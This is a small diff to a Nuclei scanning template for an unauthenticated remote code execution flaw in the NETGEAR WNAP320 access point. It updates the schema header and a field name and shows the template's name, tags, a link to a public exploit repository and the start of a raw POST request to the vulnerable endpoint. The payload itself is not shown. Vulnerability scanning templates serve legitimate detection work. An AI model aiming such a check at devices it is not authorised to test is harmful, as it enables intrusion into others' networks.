@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: netgear-wnap320-rce
 info:
   name: NETGEAR WNAP320 Access Point - Remote Code Execution (Unauthenticated)
@@ -7,7 +8,7 @@ info:
   reference:
     - https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE
   tags: netgear,rce,oast,router
-requests:
+http:
   - raw:
       - |
         POST /boardDataWW.php HTTP/1.1
